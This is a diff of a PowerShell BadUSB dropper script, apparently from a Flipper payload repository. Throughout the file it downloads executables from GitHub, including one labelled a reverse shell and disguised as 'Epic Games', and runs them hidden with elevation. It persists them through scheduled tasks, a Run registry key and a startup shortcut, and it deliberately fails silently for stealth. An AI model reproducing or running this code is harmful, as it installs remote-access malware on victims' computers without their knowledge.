@@ -1,38 +1,91 @@
-# Variables
-$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/Obfuscated Programs/WinUman.exe"
-$exePath = "$env:APPDATA\WinUman.exe"
-$shortcutName = "WinUman.lnk"
-$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$shortcutName"
-$scheduledTaskName = "WinUmanResilient"
-$unlockTaskName = "WinUmanUnlock"
 
-# --- 1. Download EXE ---
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
+# =======================
+# === CONFIG SECTION ===
+# =======================
 
-# --- 2. Run EXE hidden with admin ---
-Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden
+# Primary Reverse Shell EXE
+$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/Obfuscated Programs/Epic-Games.exe"
+$mainExePath = "$env:APPDATA\.exe"
+$mainTaskName = "Epic Games Manager"
+$mainRunKey = "Epic Games"
 
-# --- 3. Create Scheduled Task for Logon with Resilience Settings ---
-# Clean up any old version
-schtasks /Delete /TN $scheduledTaskName /F > $null 2>&1
+# Secondary Payload EXE
 
-# Use schtasks for 100% compatibility
-schtasks /Create /F /TN $scheduledTaskName /TR "`"$exePath`"" /SC ONLOGON /RL HIGHEST /RU "$env:USERNAME"
 
-# --- 4. Create Scheduled Task for Unlock Trigger ---
-schtasks /Delete /TN $unlockTaskName /F > $null 2>&1
-schtasks /Create /F /TN $unlockTaskName /TR "`"$exePath`"" /SC ONUNLOCK /RL HIGHEST /RU "$env:USERNAME"
+# One-Time Payload
+$telemetryUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
+$telemetryPath = "$env:TEMP\WinTelemetry.exe"
 
-# --- 5. Create Startup Folder Shortcut as Fallback ---
-$WshShell = New-Object -ComObject WScript.Shell
-$shortcut = $WshShell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = $exePath
-$shortcut.WorkingDirectory = Split-Path $exePath
-$shortcut.WindowStyle = 7 # Minimized window
-$shortcut.Description = "WinUman Startup Shortcut"
-$shortcut.Save()
+# ============================
+# === PERSISTENCE FUNCTION ===
+# ============================
 
-# --- 6. Add Registry Run Key Fallback ---
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $exePath
+function Add-Persistence {
+    param (
+        [string]$exePath,
+        [string]$exeUrl,
+        [string]$taskName,
+        [string]$runKeyName
+    )
 
-Write-Host "✅ Installation and persistence setup complete."
+    try {
+        # Download EXE if missing
+        if (-not (Test-Path $exePath)) {
+            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
+        }
+
+        # Start silently
+        Start-Process -FilePath $exePath -WindowStyle Hidden
+
+        # Scheduled task setup
+        $action = New-ScheduledTaskAction -Execute $exePath
+        $triggers = @(
+            New-ScheduledTaskTrigger -AtLogOn
+            New-ScheduledTaskTrigger -AtStartup
+            New-ScheduledTaskTrigger -AtIdle -IdleDuration (New-TimeSpan -Minutes 1)
+            New-ScheduledTaskTrigger -AtWorkStationUnlock
+            New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
+        )
+        $settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)
+
+        # Create scheduled task if it doesn't already exist
+        if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Settings $settings -RunLevel Highest
+        }
+
+        # Registry fallback
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runKeyName -Value $exePath
+
+        # Startup folder shortcut
+        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+        $shortcutPath = Join-Path $startupPath "$taskName.lnk"
+        $WScriptShell = New-Object -ComObject WScript.Shell
+        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+        $shortcut.TargetPath = $exePath
+        $shortcut.WorkingDirectory = Split-Path $exePath
+        $shortcut.WindowStyle = 7
+        $shortcut.Save()
+    } catch {
+        # Silent failure for stealth
+    }
+}
+
+# ===========================
+# === EXECUTE PERSISTENCE ===
+# ===========================
+
+Add-Persistence -exePath $mainExePath -exeUrl $mainExeUrl -taskName $mainTaskName -runKeyName $mainRunKey
+
+# ============================
+# === ONE-TIME PAYLOAD RUN ===
+# ============================
+
+try {
+    Invoke-WebRequest -Uri $telemetryUrl -OutFile $telemetryPath -UseBasicParsing
+    Start-Process -FilePath $telemetryPath -Verb RunAs -WindowStyle Hidden
+    Start-Sleep -Seconds 5
+    # Optionally delete it
+    # Remove-Item -Path $telemetryPath -Force
+} catch {
+    # Silent fail
+}
